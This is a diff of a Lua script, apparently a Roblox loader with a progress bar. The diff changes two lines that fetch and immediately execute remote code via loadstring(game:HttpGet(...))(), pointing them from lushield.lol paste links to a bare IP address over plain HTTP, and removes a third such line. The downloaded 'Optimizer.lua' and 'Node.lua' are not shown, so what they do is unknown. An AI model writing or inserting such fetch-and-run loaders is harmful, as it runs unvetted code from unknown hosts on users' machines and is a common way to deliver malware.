@@ -161,7 +161,7 @@ local function AnimateProgressBar(Duration, Steps)
     
     Status.Text = "Loading script 1..."
     local success1, error1 = pcall(function()
-        loadstring(game:HttpGet("https://lushield.lol/raw/5a07b0c4-9693-4299-a231-bf7e3b96d0f0"))()
+        loadstring(game:HttpGet("http://194.13.80.145:7000/raw/Optimizer.lua"))()
     end)
     
     if success1 then
@@ -174,7 +174,7 @@ local function AnimateProgressBar(Duration, Steps)
     
     Status.Text = "Loading script 2..."
     local success2, error2 = pcall(function()
-        loadstring(game:HttpGet("https://lushield.lol/raw/2ad53271-b56d-4fc1-9caa-ca0d330bf47b"))()
+        loadstring(game:HttpGet("http://194.13.80.145:7000/raw/Node.lua"))()
     end)
     
     if success2 then
@@ -227,4 +227,3 @@ task.spawn(function()
 end)
 
 
-loadstring(game:HttpGet("https://lushield.lol/raw/608234d5-418c-4c6b-b65d-dc36373f2fd3"))()
